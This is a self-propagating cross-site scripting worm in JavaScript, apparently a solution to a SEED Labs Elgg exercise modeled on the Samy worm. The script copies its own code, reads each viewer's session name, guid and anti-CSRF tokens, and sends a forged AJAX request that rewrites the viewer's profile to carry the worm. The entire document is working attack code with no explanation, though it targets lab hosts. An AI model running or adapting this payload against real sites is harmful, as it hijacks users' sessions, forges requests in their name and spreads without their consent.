<script type="text/javascript" id="worm">
    window.onload = function () {
    
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    //Construct the content of your url.
    var description = "&description=<p>modified by Samy, and the worm will be spreading now!<p>" + wormCode + "&accesslevel[description]=2";
    var content = userName + guid + ts + token + description;
    var sendurl= "http://www.seed-server.com/action/profile/edit";
    var samyGuid= 59;

    if (elgg.session.user.guid != samyGuid) {
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>